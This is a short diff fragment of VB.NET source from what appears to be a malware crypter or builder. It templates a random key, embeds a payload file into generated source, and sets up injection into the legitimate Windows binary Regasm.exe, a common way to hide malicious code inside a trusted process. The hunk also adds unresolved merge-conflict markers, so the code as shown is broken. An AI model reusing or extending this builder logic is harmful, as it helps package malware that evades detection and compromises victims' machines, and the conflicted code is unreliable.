@@ -225,6 +225,12 @@
                 Key = Helper.Randomi(12)
                 Source = Replace(Source, "%KEY%", Key)
 
+<<<<<<< HEAD
+=======
+                txtLog.AppendText("Writing Payload..." + Environment.NewLine)
+                'Source = Replace(Source, "%Payload%", Helper.iformat(IO.File.ReadAllBytes(txtPayload.Text)))
+
+>>>>>>> 7ca5918c7aa60666fffcc673bab2b312845457de
                 If chkRegasm.Checked = True Then
                     txtLog.AppendText("Injection..." + Environment.NewLine)
                     Source = Replace(Source, "%Inject%", Chr(34) + "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe" + Chr(34))
